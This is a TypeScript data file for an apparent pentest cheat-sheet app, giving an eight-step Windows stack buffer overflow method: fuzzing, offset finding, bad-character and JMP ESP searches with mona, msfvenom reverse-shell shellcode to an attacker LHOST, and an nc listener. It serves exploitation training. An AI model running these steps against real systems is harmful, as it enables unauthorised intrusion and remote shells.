import { Section } from "./types";

export const bofSection: Section = {
  id: "bof",
  title: "Buffer Overflow",
  slug: "bof",
  groups: [
    {
      title: "Step 1: Spiking",
      subtitle: "Send malformed input to find which command or field causes a crash — narrow down the attack surface.",
      commands: [
        { id: "bof-1", cmd: "generic_send_tcp {RHOST} {RPORT} stats.spk 0 0", description: "Use spike scripts to probe commands — crashes the target app to identify the vulnerable function.", tip: "Write spike scripts for each command: s_string(\"STATS \"); s_string_variable(\"0\"); to fuzz each one.", tags: ["windows"], hasVars: true },
        { id: "bof-1a", cmd: "msf-pattern_create -l 3000", description: "Alternative pattern generation — use if you prefer msf tools over spike for initial fuzzing.", tags: ["all"] },
      ],
    },
    {
      title: "Step 2: Fuzzing",
      subtitle: "Send increasingly long payloads to find the exact byte count that causes the crash.",
      commands: [
        { id: "bof-2", cmd: "python3 fuzz.py", description: "Send growing 'A' buffers until the target crashes — note the approximate byte count when it crashes.", tip: "Script should increment by 100 bytes each iteration and print the length on crash.", tags: ["all"] },
        { id: "bof-2a", cmd: "python3 -c 'print(\"A\"*1000)'", description: "Quick manual payload test — pipe to nc or use in a script to send directly to the service.", tags: ["all"] },
      ],
    },
    {
      title: "Step 3: Find Offset",
      subtitle: "Send a cyclic pattern to find the exact offset where EIP is overwritten.",
      commands: [
        { id: "bof-3", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000", description: "Generate a unique cyclic pattern — use the crash byte count + 400 as the length.", tip: "Use msf-pattern_create -l 2000 as a shorter alias on Kali.", tags: ["all"] },
        { id: "bof-3a", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {EIP}", description: "Find offset from EIP value after the crash — copy EIP from Immunity Debugger registers.", tip: "Or use: !mona findmsp -distance 2000 in Immunity Debugger for the same result.", tags: ["all"], hasVars: true },
      ],
    },
    {
      title: "Step 4: Confirm EIP",
      subtitle: "Verify you control EIP exactly by placing 4 'B' bytes (0x42424242) at the calculated offset.",
      commands: [
        { id: "bof-4", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138", description: "Resolve EIP offset from a specific pattern value — replace with the actual EIP value from your crash.", tags: ["all"] },
        { id: "bof-4a", cmd: "python3 exploit.py", description: "Send buffer with 'B'*4 at the offset — EIP should show 0x42424242 in Immunity Debugger.", tip: "If EIP shows 42424242, you have full EIP control. Adjust offset by +/- 1 if needed.", tags: ["all"] },
      ],
    },
    {
      title: "Step 5: Bad Chars",
      subtitle: "Identify bytes that corrupt the shellcode — generate and compare to find every bad character.",
      commands: [
        { id: "bof-5", cmd: "!mona bytearray -cpb \"\\x00\"", description: "Generate a byte array (\\x01-\\xff) excluding \\x00 — send it after the offset to identify corruption.", tip: "Send the full bytearray in the exploit payload after your EIP padding.", tags: ["windows"] },
        { id: "bof-5a", cmd: "!mona compare -f C:\\mona\\{APP}\\bytearray.bin -a {ESP_ADDR}", description: "Compare the sent bytearray against memory at ESP — mona highlights corrupted bytes.", tip: "For each bad char found, add to -cpb, regenerate, and compare again until no corruption.", tags: ["windows"], hasVars: true },
      ],
    },
    {
      title: "Step 6: JMP ESP",
      subtitle: "Find a stable JMP ESP address in a module without memory protections to redirect execution.",
      commands: [
        { id: "bof-6", cmd: "!mona jmp -r esp -cpb \"\\x00\"", description: "Find JMP ESP instructions excluding your bad chars — use the first address shown in results.", tip: "Write the address in little-endian: 0xAF112355 becomes \\x55\\x23\\x11\\xAF in the exploit.", tags: ["windows"] },
        { id: "bof-6a", cmd: "!mona modules", description: "Review all loaded modules — look for one with no ASLR, no DEP, no SafeSEH, no Rebase.", tip: "Prefer DLLs that belong to the application itself (not system DLLs) for portability.", tags: ["windows"] },
      ],
    },
    {
      title: "Step 7: Generate Shellcode",
      subtitle: "Generate shellcode excluding all bad chars — add 16 NOPs before shellcode to ensure clean landing.",
      commands: [
        { id: "bof-7", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f py -b \"\\x00\"", description: "Generate Python-format reverse shellcode excluding null bytes — paste into exploit script.", tip: "Add NOP sled before shellcode: padding = b'\\x90' * 16. This ensures reliable execution.", tags: ["windows"], hasVars: true },
        { id: "bof-7a", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f c -b \"\\x00\"", description: "Shellcode with EXITFUNC=thread — prevents process crash after exploit. Use for stable shells.", tip: "EXITFUNC=thread is preferred over process — keeps the target service running after exploitation.", tags: ["windows"], hasVars: true },
      ],
    },
    {
      title: "Step 8: Final Exploit",
      subtitle: "Combine all pieces: padding + EIP (JMP ESP) + NOP sled + shellcode — then catch the shell.",
      commands: [
        { id: "bof-8", cmd: "python3 exploit.py", description: "Run the final exploit — structure: A*offset + JMP_ESP + NOPs*16 + shellcode.", tip: "Final buffer structure: b'A'*offset + struct.pack('<I', jmp_esp) + b'\\x90'*16 + shellcode", tags: ["all"] },
        { id: "bof-8a", cmd: "nc -lvnp {LPORT}", description: "Start listener before running the exploit — be ready to catch the reverse shell.", tip: "Start the listener FIRST, then trigger the exploit. Shell arrives within 1-2 seconds.", tags: ["all"], hasVars: true },
      ],
    },
  ],
};
